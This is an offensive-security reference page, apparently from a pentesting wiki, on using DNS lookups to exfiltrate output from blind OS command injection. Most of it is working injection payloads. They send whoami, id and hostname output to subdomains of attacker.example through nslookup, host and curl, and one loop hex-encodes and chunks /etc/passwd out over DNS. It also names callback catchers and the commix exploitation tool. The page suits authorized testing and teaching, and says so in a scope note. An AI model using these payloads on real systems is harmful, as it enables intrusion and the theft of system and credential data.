---
title: "Blind command injection DNS out-of-band exfiltration"
description: "Encoding command output into a DNS subdomain label so it leaves a blind OS command injection target via name resolution, captured by interactsh or a dnsbin server."
keywords:
  - blind command injection
  - DNS exfiltration
  - out-of-band
  - interactsh
  - dnsbin
  - data exfiltration
---

# DNS out-of-band channel

In **blind** command injection the command runs but its output never reaches the response. DNS out-of-band (OOB) exfiltration recovers that output by making the target **resolve a hostname you control**, with the command's result packed into the subdomain label. Even hosts that block outbound HTTP usually still perform DNS lookups through an internal resolver, so name resolution is the most reliable egress channel.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.

## Mechanism

Splice command output into the label of a domain whose authoritative server you watch. Any DNS tool triggers the lookup:

```
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
127.0.0.1; host $(id|cut -d' ' -f1).OOB_ID.attacker.example
127.0.0.1; curl http://$(hostname).OOB_ID.attacker.example/
```

When the resolver walks the chain to `attacker.example`, your server logs a query for `app01.OOB_ID.attacker.example`, confirmation of execution *and* a copy of the data. A hit arrives even when the firewall permits only DNS.

## Encoding output into a label

DNS labels are limited (≤63 chars per label, `[a-z0-9-]`, case-insensitive). Normalize output before it becomes a hostname:

```
# hex-encode to survive the charset and case-folding
127.0.0.1; nslookup $(whoami|xxd -p|head -c40).OOB_ID.attacker.example

# base32 is label-safe (no padding issues once lowercased)
127.0.0.1; nslookup $(id|base32|tr -d '='|tr A-Z a-z).OOB_ID.attacker.example
```

base64 is a poor fit (`+`, `/`, `=` and case are not label-safe); prefer **hex** or **base32**.

## Chunking longer data

Output larger than one label must be split and reassembled from the query log. Loop over fixed-size slices and tag each with its index:

```
127.0.0.1; for i in 0 1 2 3; do \
  nslookup $i.$(cut -c$((i*20+1))-$((i*20+20)) /etc/passwd|xxd -p).OOB_ID.attacker.example; \
done
```

A common pattern reads a file, hex-encodes it, and emits sequential labels (`0.<data>`, `1.<data>`, …); the index lets you order fragments that arrive out of sequence. `fold`/`split` or `xargs -n1` drive the chunking where a `for` loop is awkward.

## Catching the callbacks

- **[interactsh](https://github.com/projectdiscovery/interactsh)**, self-hostable OOB server; `interactsh-client` prints each DNS interaction with the full queried name.
- **Burp Collaborator**, generates a unique subdomain and shows DNS/HTTP hits in Repeater/Intruder.
- **dnsbin / dnslog.cn / requestbin-style** services, quick public catchers for labs where self-hosting isn't warranted.
- Your own authoritative DNS (`tcpdump -n port 53`, or a logging resolver) when you control a domain.

## Delivery notes

The payload itself is injected with any separator or substitution primitive (`;`, `&&`, `$(...)`); DNS exfiltration is about the **channel**, not the injection. Prefer `$(...)` so output is spliced inline, and keep the generating command short, label and total-name length limits cap how much rides on a single query, which is exactly why chunking matters.

## Tools

- **[interactsh](https://github.com/projectdiscovery/interactsh)**, OOB interaction capture.
- **[commix](https://github.com/commixproject/commix)**, automates blind/OOB command-injection exploitation.
- **Burp Collaborator**, integrated DNS/HTTP callback catcher.

## References

- [PortSwigger Web Security Academy: Blind OS command injection with out-of-band exfiltration](https://portswigger.net/web-security/os-command-injection)
- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
